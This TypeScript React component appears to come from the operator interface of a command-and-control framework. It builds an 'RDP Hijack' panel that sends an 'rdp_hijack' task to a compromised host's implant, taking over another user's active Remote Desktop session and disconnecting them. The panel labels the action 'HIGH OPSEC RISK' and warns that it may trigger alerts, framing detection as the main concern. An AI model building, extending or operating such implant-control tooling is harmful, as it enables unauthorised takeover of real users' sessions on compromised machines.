import { useState } from 'react';
import { taskClient } from '../../api';

interface Props {
  sessionId: string;
}

function hexToUint8Array(hex: string): Uint8Array<ArrayBuffer> {
  const buffer = new ArrayBuffer(hex.length / 2);
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

function int32ToLEBytes(n: number): Uint8Array<ArrayBuffer> {
  const buf = new ArrayBuffer(4);
  new DataView(buf).setUint32(0, n, true /* little-endian */);
  return new Uint8Array(buf) as Uint8Array<ArrayBuffer>;
}

export function RDPHijackPanel({ sessionId }: Props) {
  const [rdpSessionId, setRdpSessionId] = useState('');
  const [showConfirm, setShowConfirm] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [taskId, setTaskId] = useState<string | null>(null);
  const [result, setResult] = useState<string | null>(null);

  const handleHijackClick = () => {
    setError(null);
    const parsed = parseInt(rdpSessionId, 10);
    if (!rdpSessionId || isNaN(parsed) || parsed < 0) {
      setError('Enter a valid RDP session ID (non-negative integer).');
      return;
    }
    setShowConfirm(true);
  };

  const handleConfirm = async () => {
    setShowConfirm(false);
    setLoading(true);
    setError(null);
    setResult(null);
    try {
      const parsed = parseInt(rdpSessionId, 10);
      const taskData = int32ToLEBytes(parsed);

      const response = await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId) },
        taskType: 'rdp_hijack',
        taskData,
      });

      const id = response.taskId
        ? Array.from(response.taskId.value).map(b => b.toString(16).padStart(2, '0')).join('')
        : '';
      setTaskId(id);
      setResult(`Hijack task dispatched for RDP session ${parsed}.`);
    } catch (err: any) {
      setError(err.message || 'Failed to dispatch task');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="p-4 space-y-4">
      <div className="flex items-center justify-between">
        <h3 className="text-ctp-text font-semibold text-sm uppercase tracking-wide">RDP Hijack</h3>
        <span className="inline-flex items-center gap-1.5 text-xs px-2 py-1 rounded-full font-medium bg-ctp-red/20 text-ctp-red border border-ctp-red/30">
          <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
          </svg>
          HIGH OPSEC RISK
        </span>
      </div>

      <div className="px-3 py-2 rounded bg-ctp-yellow/10 border border-ctp-yellow/30 text-ctp-yellow text-xs">
        Hijacking an active RDP session will take control from the current user and may trigger alerts. Use with caution.
      </div>

      <div className="space-y-3">
        <div>
          <label className="block text-xs text-ctp-subtext0 mb-1">RDP Session ID</label>
          <input
            type="number"
            min="0"
            value={rdpSessionId}
            onChange={e => setRdpSessionId(e.target.value)}
            placeholder="e.g. 2"
            disabled={loading}
            className="w-full bg-ctp-surface0 border border-ctp-surface2 rounded px-3 py-2 text-sm text-ctp-text placeholder-ctp-subtext0 focus:outline-none focus:border-ctp-blue disabled:opacity-50"
          />
        </div>

        <button
          onClick={handleHijackClick}
          disabled={loading || !rdpSessionId}
          className="px-4 py-2 rounded text-sm font-medium bg-ctp-red text-ctp-base hover:bg-ctp-red/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {loading ? 'Dispatching...' : 'Hijack Session'}
        </button>
      </div>

      {error && (
        <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-sm border border-ctp-red/30">
          {error}
        </div>
      )}

      {taskId && (
        <div className="text-xs text-ctp-subtext0">
          Task ID: <span className="font-mono text-ctp-blue">{taskId}</span>
        </div>
      )}

      {result && (
        <div className="px-3 py-2 rounded bg-ctp-green/10 text-ctp-green text-sm border border-ctp-green/30">
          {result}
        </div>
      )}

      {/* Confirmation dialog */}
      {showConfirm && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-ctp-base/80 backdrop-blur-sm">
          <div className="bg-ctp-mantle border border-ctp-surface2 rounded-lg shadow-xl p-6 max-w-sm w-full mx-4 space-y-4">
            <div className="flex items-start gap-3">
              <div className="shrink-0 w-8 h-8 rounded-full bg-ctp-red/20 flex items-center justify-center">
                <svg className="w-4 h-4 text-ctp-red" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                </svg>
              </div>
              <div>
                <h4 className="text-ctp-text font-semibold text-sm">Confirm RDP Hijack</h4>
                <p className="text-ctp-subtext0 text-xs mt-1">
                  This will hijack an active RDP session (ID: <span className="font-mono text-ctp-text">{rdpSessionId}</span>). The current session user will be disconnected.
                </p>
              </div>
            </div>
            <div className="flex gap-2 justify-end">
              <button
                onClick={() => setShowConfirm(false)}
                className="px-3 py-1.5 rounded text-sm bg-ctp-surface1 text-ctp-text hover:bg-ctp-surface2 transition-colors"
              >
                Cancel
              </button>
              <button
                onClick={handleConfirm}
                className="px-3 py-1.5 rounded text-sm bg-ctp-red text-ctp-base hover:bg-ctp-red/80 transition-colors"
              >
                Confirm Hijack
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
